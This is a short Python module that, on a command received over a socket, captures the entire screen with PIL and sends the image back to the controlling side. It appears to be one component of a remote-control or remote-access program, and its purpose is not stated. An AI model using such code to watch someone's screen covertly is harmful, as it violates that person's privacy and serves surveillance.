import io
from PIL import ImageGrab

class Screenshot:
    def __init__(self, sock):
        self.client = sock
        pass

    def run(self):
        while True:
            cmd = self.client.recv(32).decode('utf8')
            if cmd == "screenshot,snap":
                image = ImageGrab.grab()
                byteIO = io.BytesIO()
                image.save(byteIO, format = 'BMP')
                byteArr = byteIO.getvalue()
                # send image Size then read image
                self.client.send(bytes(str(len(byteArr)), "utf8"))
                self.client.send(byteArr)
            elif cmd == "exit":
                return